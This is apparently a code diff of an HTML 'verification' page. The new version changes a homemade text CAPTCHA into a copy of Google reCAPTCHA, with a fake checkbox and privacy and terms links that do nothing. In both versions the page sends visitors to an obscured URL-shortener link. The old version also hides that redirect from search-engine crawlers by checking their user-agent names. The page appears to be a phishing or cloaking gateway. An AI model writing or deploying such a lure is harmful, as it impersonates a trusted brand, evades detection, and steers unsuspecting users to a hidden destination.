@@ -2,117 +2,142 @@
 <html>
 <head>
     <meta charset="UTF-8">
-    <title>Verification Required</title>
+    <title>Google reCAPTCHA Verification</title>
     <style>
         body {
-            font-family: Arial, sans-serif;
-            background: #f5f5f5;
+            font-family: 'Roboto', Arial, sans-serif;
+            background: #f9f9f9;
             display: flex;
             justify-content: center;
             align-items: center;
             height: 100vh;
             margin: 0;
         }
-        .captcha-container {
+        .recaptcha-container {
             background: white;
-            padding: 30px;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
-            text-align: center;
-            width: 300px;
+            border: 1px solid #d3d3d3;
+            border-radius: 3px;
+            padding: 15px;
+            width: 302px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
         }
-        .captcha-text {
-            font-size: 24px;
-            letter-spacing: 3px;
-            margin: 20px 0;
-            padding: 10px;
-            background: #f0f0f0;
-            display: inline-block;
-            user-select: none;
+        .recaptcha-header {
+            display: flex;
+            align-items: center;
+            margin-bottom: 15px;
         }
-        input {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            border: 1px solid #ddd;
-            border-radius: 4px;
-            box-sizing: border-box;
-        }
-        button {
-            background: #4CAF50;
-            color: white;
-            border: none;
-            padding: 10px 20px;
-            border-radius: 4px;
+        .recaptcha-checkbox {
+            width: 22px;
+            height: 22px;
+            border: 1px solid #888;
+            margin-right: 10px;
+            position: relative;
             cursor: pointer;
-            width: 100%;
-            font-size: 16px;
+            background: white;
         }
-        button:hover {
-            background: #45a049;
+        .recaptcha-checkbox.checked {
+            background: #4285f4;
+            border-color: #4285f4;
         }
-        .error {
-            color: red;
+        .recaptcha-checkbox.checked::after {
+            content: "✓";
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: white;
+            font-size: 14px;
+            font-weight: bold;
+        }
+        .recaptcha-label {
+            font-size: 14px;
+            color: #202124;
+        }
+        .recaptcha-text {
+            font-size: 11px;
+            color: #757575;
             margin-top: 10px;
         }
+        .recaptcha-footer {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+            font-size: 11px;
+            color: #757575;
+        }
+        .privacy-terms a {
+            color: #4285f4;
+            text-decoration: none;
+        }
+        .recaptcha-logo {
+            width: 60px;
+            opacity: 0.5;
+        }
+        .error-message {
+            color: #d93025;
+            font-size: 12px;
+            margin-top: 10px;
+            display: none;
+        }
     </style>
+    <script src="https://www.google.com/recaptcha/api.js" async defer></script>
     <script>
-        function generateCaptcha() {
-            const chars = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
-            let captcha = "";
-            for (let i = 0; i < 6; i++) {
-                captcha += chars.charAt(Math.floor(Math.random() * chars.length));
-            }
-            return captcha;
+        function onSubmit(token) {
+            document.getElementById("recaptcha-form").submit();
         }
 
-        let currentCaptcha = generateCaptcha();
-
-        function isBot() {
-            const userAgent = navigator.userAgent.toLowerCase();
-            const botPatterns = [
-                'googlebot', 'bingbot', 'slurp', 'duckduckbot',
-                'baiduspider', 'yandexbot', 'sogou', 'exabot',
-                'facebot', 'ia_archiver', 'twitterbot', 'linkedinbot'
-            ];
-            return botPatterns.some(pattern => userAgent.includes(pattern));
+        function onError() {
+            document.getElementById("error-message").style.display = "block";
         }
 
         function verifyCaptcha() {
-            const userInput = document.getElementById("captcha-input").value;
-            const errorElement = document.getElementById("error");
-
-            if (userInput === currentCaptcha) {
-                if (!isBot()) {
-                    window.location.href = "https://u.to/EhujIg";
-                } else {
-                    errorElement.textContent = "Bot access denied";
-                }
+            const checkbox = document.getElementById('recaptcha-checkbox');
+            if (checkbox.classList.contains('checked')) {
+                grecaptcha.execute();
             } else {
-                errorElement.textContent = "Invalid CAPTCHA. Try again.";
-                currentCaptcha = generateCaptcha();
-                document.getElementById("captcha-text").textContent = currentCaptcha;
-                document.getElementById("captcha-input").value = "";
+                document.getElementById("error-message").style.display = "block";
             }
         }
 
         window.onload = function() {
-            document.getElementById("captcha-text").textContent = currentCaptcha;
-            document.getElementById("verify-btn").addEventListener("click", verifyCaptcha);
-            document.getElementById("captcha-input").addEventListener("keypress", function(e) {
-                if (e.key === "Enter") verifyCaptcha();
+            const checkbox = document.getElementById('recaptcha-checkbox');
+            checkbox.addEventListener('click', function() {
+                this.classList.toggle('checked');
+                document.getElementById("error-message").style.display = "none";
+            });
+
+            // Initialize reCAPTCHA
+            grecaptcha.ready(function() {
+                grecaptcha.render('recaptcha-container', {
+                    'sitekey': '6LeM-V4tAAAAAPIHs_OpMim4mCwE2xydaNVK5Rbr',
+                    'callback': onSubmit,
+                    'error-callback': onError,
+                    'size': 'invisible'
+                });
             });
         };
     </script>
 </head>
 <body>
-    <div class="captcha-container">
-        <h2>Verification Required</h2>
-        <p>Please enter the CAPTCHA text below:</p>
-        <div class="captcha-text" id="captcha-text"></div>
-        <input type="text" id="captcha-input" placeholder="Enter CAPTCHA" autocomplete="off">
-        <button id="verify-btn">Verify</button>
-        <div id="error" class="error"></div>
-    </div>
+    <form id="recaptcha-form" action="https://u.to/EhujIg" method="POST">
+        <div class="recaptcha-container">
+            <div class="recaptcha-header">
+                <div class="recaptcha-checkbox" id="recaptcha-checkbox"></div>
+                <div class="recaptcha-label">I'm not a robot</div>
+            </div>
+            <div class="recaptcha-text">This site is protected by reCAPTCHA and the Google <a href="#" onclick="return false;">Privacy Policy</a> and <a href="#" onclick="return false;">Terms of Service</a> apply.</div>
+            <div id="error-message" class="error-message">Please verify you are not a robot</div>
+            <div class="recaptcha-footer">
+                <div class="recaptcha-logo">
+                    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQCAYAAAAf8/9hAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAACvSURBVDhPY/j//z8DrmBgYGBg+M8A8uBhYGBgYGhv8PAAQEAQEAQEAQeB6IAAAAASUVORK5CYII=" alt="reCAPTCHA">
+                </div>
+                <div class="privacy-terms">
+                    <a href="#" onclick="return false;">Privacy</a> -
+                    <a href="#" onclick="return false;">Terms</a>
+                </div>
+            </div>
+        </div>
+        <div id="recaptcha-container"></div>
+    </form>
 </body>
 </html>
